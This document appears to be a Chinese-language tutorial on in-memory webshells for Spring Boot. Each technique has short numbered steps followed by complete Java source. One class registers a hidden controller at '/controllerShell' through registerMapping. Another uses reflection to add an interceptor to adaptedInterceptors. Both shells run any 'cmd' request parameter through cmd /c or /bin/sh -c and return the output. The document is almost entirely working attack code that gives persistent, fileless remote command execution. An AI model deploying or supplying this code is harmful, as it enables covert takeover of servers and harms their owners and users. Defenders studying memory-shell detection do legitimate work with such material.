## controller

1. 从springboot中获取上下文context
2. 定义好要注入Controller的路径以及处理请求使用的逻辑（方法），通过反射获取其实现的一个恶意方法。
3. 利用mappingHandlerMapping.registerMapping（）方法将其注入到处理中去。

**AddControllerShell**

```java
@RestController
public class AddControllerShell {

    @RequestMapping("addControllerShell")
    public String AddControllerShell() throws Exception {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        // 2. 通过反射获得自定义 controller 中test的 Method 对象
        Method method = AddControllerShell.class.getMethod("exec");
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/controllerShell");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);

        mappingHandlerMapping.registerMapping(info, AddControllerShell.class.newInstance(), method);
        return "add ControllerShell success";
    }
    public void exec() throws Exception {
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        if(request.getParameter("cmd")!=null){
            String[] commands = new String[3];
            String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                commands[0] = "cmd";
                commands[1] = "/c";
            } else {
                commands[0] = "/bin/sh";
                commands[1] = "-c";
            }
            commands[2]=request.getParameter("cmd");
            InputStream in = Runtime.getRuntime().exec(commands).getInputStream();
            Scanner s = new Scanner(in,charsetName).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            System.out.println(output);
            response.getWriter().write(output);
            response.getWriter().flush();
        }
    }
}
```

## interceptor

1. 从springboot中获取上下文context
2. 获取context中AbstractHandlerMapping对象的adaptedInterceptors属性
3. 把恶意Interceptor添加到adaptedInterceptors中去

**InterceptorShell**

```java
@RestController
public class InterceptorShell implements HandlerInterceptor {

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if(request.getParameter("cmd")!=null){
            String[] commands = new String[3];
            String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                commands[0] = "cmd";
                commands[1] = "/c";
            } else {
                commands[0] = "/bin/sh";
                commands[1] = "-c";
            }
            commands[2]=request.getParameter("cmd");
            InputStream in = Runtime.getRuntime().exec(commands).getInputStream();
            Scanner s = new Scanner(in,charsetName).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            System.out.println(output);
            response.getWriter().write(output);
            response.getWriter().flush();
        }
        return true;
    }

}
```

**AddInterceptorShell**

```java
@RestController
public class AddInterceptorShell {

    @RequestMapping("addInterceptorShell")
    public String add()throws Exception {
        // 获取context
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 从context中获取AbstractHandlerMapping的实例对象
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
        // 反射获取adaptedInterceptors属性
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
        adaptedInterceptors.add(new InterceptorShell());
        return "ok";
    }
}
```